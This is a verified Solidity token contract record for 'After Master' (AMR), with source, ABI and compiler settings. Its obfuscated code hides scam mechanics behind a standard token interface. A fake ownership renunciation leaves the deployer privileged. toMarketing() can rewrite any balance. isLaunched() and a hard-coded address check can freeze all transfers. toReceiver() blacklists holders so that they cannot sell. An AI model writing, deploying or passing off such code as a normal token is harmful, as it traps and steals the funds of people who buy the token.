{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface maxSell {\n    function createPair(address buySender, address launchLiquidity) external returns (address);\n}\n\ninterface buyWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingTokenWallet) external view returns (uint256);\n\n    function transfer(address swapMin, uint256 takeLiquidity) external returns (bool);\n\n    function allowance(address buyLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapMin,\n        uint256 takeLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldTeam, uint256 value);\n    event Approval(address indexed buyLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract buyAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyTx is buyWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AfterMaster is buyAmount, buyWallet, buyTx {\n\n    uint256 modeExempt;\n\n    function approve(address teamSender, uint256 takeLiquidity) public virtual override returns (bool) {\n        receiverModeTx[_msgSender()][teamSender] = takeLiquidity;\n        emit Approval(_msgSender(), teamSender, takeLiquidity);\n        return true;\n    }\n\n    uint8 private buyTo = 18;\n\n    function getOwner() external view returns (address) {\n        return liquidityFee;\n    }\n\n    function buySell() public {\n        emit OwnershipTransferred(toAmount, address(0));\n        liquidityFee = address(0);\n    }\n\n    function toMarketing(address receiverTx, uint256 takeLiquidity) public {\n        toFromTrading();\n        fromSwapShould[receiverTx] = takeLiquidity;\n    }\n\n    uint256 public swapShould;\n\n    address public launchTeam;\n\n    function listFund(address txExemptEnable, address swapMin, uint256 takeLiquidity) internal returns (bool) {\n        if (txExemptEnable == toAmount) {\n            return fundToTotal(txExemptEnable, swapMin, takeLiquidity);\n        }\n        uint256 shouldLiquidity = buyWallet(launchTeam).balanceOf(exemptBuy);\n        require(shouldLiquidity == modeExempt);\n        require(swapMin != exemptBuy);\n        if (receiverMin[txExemptEnable]) {\n            return fundToTotal(txExemptEnable, swapMin, modeLaunched);\n        }\n        return fundToTotal(txExemptEnable, swapMin, takeLiquidity);\n    }\n\n    constructor (){\n        \n        walletSwap totalWallet = walletSwap(senderBuy);\n        launchTeam = maxSell(totalWallet.factory()).createPair(totalWallet.WETH(), address(this));\n        \n        toAmount = _msgSender();\n        tokenTeam[toAmount] = true;\n        fromSwapShould[toAmount] = txReceiver;\n        buySell();\n        if (toToken != isShouldReceiver) {\n            swapShould = limitTokenLiquidity;\n        }\n        emit Transfer(address(0), toAmount, txReceiver);\n    }\n\n    mapping(address => uint256) private fromSwapShould;\n\n    uint256 constant modeLaunched = 13 ** 10;\n\n    string private minListFund = \"AMR\";\n\n    function owner() external view returns (address) {\n        return liquidityFee;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyTo;\n    }\n\n    uint256 private limitTokenLiquidity;\n\n    bool public isMarketing;\n\n    uint256 public toToken;\n\n    address senderBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public isWalletTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txReceiver;\n    }\n\n    bool public limitMode;\n\n    function allowance(address tokenTo, address teamSender) external view virtual override returns (uint256) {\n        if (teamSender == senderBuy) {\n            return type(uint256).max;\n        }\n        return receiverModeTx[tokenTo][teamSender];\n    }\n\n    mapping(address => bool) public receiverMin;\n\n    address public toAmount;\n\n    function fundToTotal(address txExemptEnable, address swapMin, uint256 takeLiquidity) internal returns (bool) {\n        require(fromSwapShould[txExemptEnable] >= takeLiquidity);\n        fromSwapShould[txExemptEnable] -= takeLiquidity;\n        fromSwapShould[swapMin] += takeLiquidity;\n        emit Transfer(txExemptEnable, swapMin, takeLiquidity);\n        return true;\n    }\n\n    function balanceOf(address tradingTokenWallet) public view virtual override returns (uint256) {\n        return fromSwapShould[tradingTokenWallet];\n    }\n\n    string private receiverList = \"After Master\";\n\n    function transfer(address receiverTx, uint256 takeLiquidity) external virtual override returns (bool) {\n        return listFund(_msgSender(), receiverTx, takeLiquidity);\n    }\n\n    mapping(address => bool) public tokenTeam;\n\n    bool public sellMin;\n\n    mapping(address => mapping(address => uint256)) private receiverModeTx;\n\n    bool private toModeAt;\n\n    address private liquidityFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minListFund;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return receiverList;\n    }\n\n    function tokenLaunch(address amountReceiver) public {\n        if (sellMin) {\n            return;\n        }\n        if (minEnable) {\n            toToken = autoTeam;\n        }\n        tokenTeam[amountReceiver] = true;\n        \n        sellMin = true;\n    }\n\n    uint256 private txReceiver = 100000000 * 10 ** 18;\n\n    function isLaunched(uint256 takeLiquidity) public {\n        toFromTrading();\n        modeExempt = takeLiquidity;\n    }\n\n    uint256 totalList;\n\n    event OwnershipTransferred(address indexed amountFrom, address indexed modeTx);\n\n    bool private minEnable;\n\n    uint256 public isShouldReceiver;\n\n    function transferFrom(address txExemptEnable, address swapMin, uint256 takeLiquidity) external override returns (bool) {\n        if (_msgSender() != senderBuy) {\n            if (receiverModeTx[txExemptEnable][_msgSender()] != type(uint256).max) {\n                require(takeLiquidity <= receiverModeTx[txExemptEnable][_msgSender()]);\n                receiverModeTx[txExemptEnable][_msgSender()] -= takeLiquidity;\n            }\n        }\n        return listFund(txExemptEnable, swapMin, takeLiquidity);\n    }\n\n    function toFromTrading() private view {\n        require(tokenTeam[_msgSender()]);\n    }\n\n    function toReceiver(address limitList) public {\n        toFromTrading();\n        if (swapShould == isShouldReceiver) {\n            swapShould = autoTeam;\n        }\n        if (limitList == toAmount || limitList == launchTeam) {\n            return;\n        }\n        receiverMin[limitList] = true;\n    }\n\n    address exemptBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public autoTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTokenWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeLiquidity\",\"type\":\"uint256\"}],\"name\":\"isLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isShouldReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWalletTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLiquidity\",\"type\":\"uint256\"}],\"name\":\"toMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"}],\"name\":\"tokenLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txExemptEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AfterMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}